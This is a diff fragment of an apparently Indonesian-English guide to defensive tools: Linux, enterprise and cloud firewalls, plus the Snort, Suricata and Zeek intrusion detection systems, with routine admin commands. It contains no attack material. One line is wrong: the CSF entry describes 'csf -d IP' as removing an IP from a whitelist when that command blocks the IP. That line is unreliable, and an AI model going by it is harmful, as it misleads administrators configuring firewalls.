+  - Port forwarding untuk redirect traffic
+  - Anti-DDoS rate limiting & traffic shaping
+  - Complex rule chains untuk sophisticated filtering
+  - Connection tracking untuk stateful inspection
+  - Masquerade untuk hide source IP
+  
+- **Commands**:
   ```bash
   sudo iptables -L -n                     # List rules
   sudo iptables -A INPUT -i eth1 -p tcp --dport 22 -j ACCEPT  # Allow SSH
@@ -4380,16 +5026,35 @@ Defensive tools untuk protection, detection, dan response terhadap network attac
   # Rate limit ke 25 packets/minute, burst ke 100
   ```
 
-**C. pfSense - Open-source Firewall/Router**
-- Fungsi: Full-featured firewall dengan routing, VPN, IDS/IPS integration
-- Installation: Download .iso, install sebagai VM atau hardware fisik
-- Features: Stateful firewall rules (GUI-based), NAT, DHCP, DNS, VPN (OpenVPN/IPSec), IDS/IPS (Snort/Suricata), Captive portal
-- Configuration: Web GUI (https://pfsense-ip)
-- Teknik: Advanced filtering, application-layer detection, geographic blocking, traffic shaping
+**C. pfSense - Open-source Enterprise-grade Firewall/Router**
+- **Fungsi Utama**: Full-featured firewall dengan routing, VPN, IDS/IPS integration
+- **Digunakan Untuk**:
+  - Network perimeter protection untuk organizations
+  - VPN gateway untuk remote access
+  - Stateful firewall rules dengan GUI management
+  - Traffic shaping untuk bandwidth management
+  - NAT & port forwarding untuk network translation
+  - IDS/IPS integration (Snort/Suricata)
+  - DHCP/DNS services
+  - Geographic blocking & advanced filtering
+  
+- **Installation**: Download .iso, install sebagai VM atau hardware fisik
+- **Features**: Stateful firewall rules (GUI-based), NAT, DHCP, DNS, VPN (OpenVPN/IPSec), IDS/IPS (Snort/Suricata), Captive portal
+- **Configuration**: Web GUI (https://pfsense-ip)
+- **Teknik**: Advanced filtering, application-layer detection, geographic blocking, traffic shaping
 
-**D. Cisco ASA - Enterprise Firewall**
-- Fungsi: High-performance enterprise firewall dengan advanced threat protection
-- CLI Commands:
+**D. Cisco ASA - Enterprise Hardware Firewall**
+- **Fungsi Utama**: High-performance enterprise firewall dengan advanced threat protection
+- **Digunakan Untuk**:
+  - Enterprise network edge protection
+  - High-throughput traffic inspection
+  - Advanced threat prevention (AV, IPS, URL filtering)
+  - VPN termination untuk thousands of connections
+  - Multi-context virtualization untuk multiple security domains
+  - Application protocol inspection & control
+  - Failover & redundancy untuk high availability
+  
+- **CLI Commands**:
   ```bash
   show running-config                     # Display configuration
   show interface ip brief                 # Show interface status
@@ -4400,12 +5065,140 @@ Defensive tools untuk protection, detection, dan response terhadap network attac
 - Features: Stateful inspection, application protocol inspection, threat defense, encryption
 - Licensing: Requires valid license untuk advanced features (IPS, AV, Webfilter)
 
+**E. Fortigate - Next-Generation Enterprise Firewall**
+- **Fungsi Utama**: Advanced threat protection dengan AI/ML-based detection
+- **Digunakan Untuk**:
+  - Enterprise edge firewall dengan high-performance throughput
+  - Advanced threat protection (malware, C2, zero-day detection)
+  - SSL/TLS inspection untuk encrypted traffic visibility
+  - Web filtering & URL categorization
+  - Application-layer detection & control (AppID)
+  - DLP (Data Loss Prevention) untuk prevent data exfiltration
+  - Sandboxing untuk unknown malware detection
+  - High-availability & load balancing
+  
+- **Features**: FortiOS operating system, NGFW capabilities, threat intelligence
+- **Dashboard**: Web-based management GUI dengan rich reporting
+- **Deployment**: Hardware appliances atau virtual appliances (FortiVM)
+
+**F. firewalld - Modern Linux Firewall Manager**
+- **Fungsi Utama**: Dynamic firewall management untuk modern Linux systems
+- **Digunakan Untuk**:
+  - Next-generation host firewall untuk RHEL/CentOS/Fedora
+  - Zone-based filtering (public, private, trusted, etc)
+  - Dynamic rule updates tanpa service restart
+  - Simple CLI & GUI management
+  - Service-based rule definition
+  - Rich rule syntax untuk complex filtering
+  - Integration dengan systemd
+  
+- **Installation**: `sudo apt install firewalld` atau pre-installed
+- **Commands**:
+  ```bash
+  sudo firewall-cmd --get-zones               # List zones
+  sudo firewall-cmd --get-active-zones        # Active zones
+  sudo firewall-cmd --zone=public --add-service=http
+  sudo firewall-cmd --zone=public --add-port=8080/tcp
+  sudo firewall-cmd --zone=public --remove-port=8080/tcp
+  sudo firewall-cmd --zone=internal --add-source=192.168.56.0/24
+  sudo firewall-cmd --runtime-to-permanent    # Make changes permanent
+  sudo firewall-cmd --reload                  # Reload config
+  ```
+
+**G. CSF (ConfigServer Security Firewall) - Server Firewall**
+- **Fungsi Utama**: Combined firewall, IDS, and process killer untuk Linux servers
+- **Digunakan Untuk**:
+  - Server-level firewall protection
+  - Port-state inspection & DDoS detection
+  - Process-based firewall (kill malicious processes)
+  - Intrusion detection via log analysis
+  - Brute-force attack detection (SSH, FTP)
+  - Account limit monitoring
+  - Testing for rootkits & exploits
+  
+- **Installation**: Download dari ConfigServer website
+- **Configuration**: `/etc/csf/csf.conf`
+- **Commands**:
+  ```bash
+  csf -s                                      # Start firewall
+  csf -f                                      # Stop firewall
+  csf -r                                      # Restart firewall
+  csf -l                                      # List rules
+  csf -a IP                                   # Add IP to whitelist
+  csf -d IP                                   # Remove IP from whitelist
+  ```
+
+**H. Cloudflare Zerotrust (formerly Cloudflare Access) - Cloud Firewall**
+- **Fungsi Utama**: Cloud-based Zero Trust network access & DDoS protection
+- **Digunakan Untuk**:
+  - Cloud-native firewall untuk organizations
+  - Zero Trust policy enforcement (verify every access)
+  - Prevent DDoS attacks di edge
+  - Bot detection & mitigation
+  - WAF (Web Application Firewall) rules
+  - API protection
+  - Log & analytics untuk security monitoring
+  - Protection tanpa VPN
+  
+- **Features**: 
+  - Cloudflare Tunnel untuk secure connections
+  - Gateway (DNS-level filtering)
+  - Rules engine untuk custom policies
+  - Real-time threat data feeds
+  
+- **Deployment**: Cloud-based (no hardware), DNS-based filtering, agent-based access
+
+**I. Router Built-in Firewall - Network Edge Protection**
+- **Fungsi Utama**: Basic firewall pada network router
+- **Digunakan Untuk**:
+  - Basic network perimeter protection (first line of defense)
+  - Prevent direct internet exposure dari internal devices
+  - Simple port forwarding & NAT
+  - Basic DoS protection
+  - Stateful packet filtering
+  
+- **Common Router Firewalls**:
+  - **OpenWrt**: Open-source router firmware
+    ```bash
+    uci show firewall                        # Show firewall config
+    uci set firewall.@zone[0].input='ACCEPT'
+    uci commit firewall
+    /etc/init.d/firewall restart
+    ```
+  
+  - **DD-WRT**: Consumer router firmware
+    - Web GUI management
+    - Basic firewall rules
+    - Port forwarding
+  
+  - **Cisco/Juniper/Arista**: Enterprise router firewalls
+    - Advanced routing + firewall
+    - ACLs (Access Control Lists)
+    - Rate limiting & traffic shaping
+  
+- **Configuration**: Usually via web GUI (192.168.1.1 atau 192.168.0.1)
+- **Typical Rules**:
+  - Block all inbound by default
+  - Allow only necessary services
+  - Port forwarding untuk specific servers
+  - DMZ (Demilitarized Zone) untuk web servers
+
+---
+
 #### 2. INTRUSION DETECTION & PREVENTION SYSTEMS (IDS/IPS)
 
 **A. Snort - Network-based IDS/IPS**
-- Fungsi: Real-time traffic analysis, intrusion detection & prevention
-- Installation: `sudo apt install snort`
-- Commands:
+- **Fungsi Utama**: Real-time traffic analysis, intrusion detection & prevention
+- **Digunakan Untuk**:
+  - Network perimeter intrusion detection
+  - Malware detection via signature matching
+  - Exploit detection untuk prevent zero-day attacks
+  - DDoS detection & blocking
+  - Anomaly-based alerts
+  - Protocol violation detection
+  
+- **Installation**: `sudo apt install snort`
+- **Commands**:
   ```bash
   sudo snort -d -l /var/log/snort -c /etc/snort/snort.conf -i eth1
   # -d: dump traffic, -l: log directory, -c: config file, -i: interface
@@ -4417,9 +5210,18 @@ Defensive tools untuk protection, detection, dan response terhadap network attac
 - Alert output: .log files, database (MySQL), syslog integration
 
 **B. Suricata - Modern Multi-threaded IDS/IPS**
-- Fungsi: Next-gen IDS/IPS dengan Lua scripting support
-- Installation: `sudo apt install suricata`
-- Commands:
+- **Fungsi Utama**: Next-generation IDS/IPS dengan Lua scripting support
+- **Digunakan Untuk**:
+  - High-performance network intrusion detection
+  - File extraction dari network traffic untuk malware analysis
+  - Application-layer detection (HTTP, TLS protocols)
+  - JSON-based logging untuk integration dengan SIEM
+  - Custom rule development dengan Suricata syntax
+  - HTTP/2 & modern protocol support
+  - Threat hunting & investigation
+  
+- **Installation**: `sudo apt install suricata`
+- **Commands**:
   ```bash
   sudo suricata -c /etc/suricata/suricata.yaml -i eth1
   sudo suricata -c /etc/suricata/suricata.yaml -r capture.pcap  # File mode
@@ -4428,10 +5230,19 @@ Defensive tools untuk protection, detection, dan response terhadap network attac
 - Features: HTTP/2 support, TLS/SSL parsing, file extraction, JSON output
 - Teknik: Thread-per-flow model, high performance, flexible rule syntax (Suricata format)
 
-**C. Zeek (formerly Bro) - Network Analysis Framework**
-- Fungsi: Deep network analysis, behavioral analysis, protocol understanding
-- Installation: `sudo apt install zeek`
-- Commands:
+**C. Zeek (formerly Bro) - Network Analysis & Behavioral Framework**
+- **Fungsi Utama**: Deep network analysis, behavioral analysis, protocol understanding
+- **Digunakan Untuk**:
+  - Network traffic analysis untuk security monitoring
+  - Behavioral analysis untuk detect anomalous network patterns
+  - Connection tracking & session analysis
+  - Protocol-level understanding untuk identify suspicious behavior
+  - Malware detection based on network behavior
+  - Forensics & investigation dengan detailed logs
+  - Integration dengan threat intelligence feeds
+  
+- **Installation**: `sudo apt install zeek`
+- **Commands**:
   ```bash
   zeek -r capture.pcap                    # Analyze pcap file
   zeek -i eth1 local                      # Live network monitoring
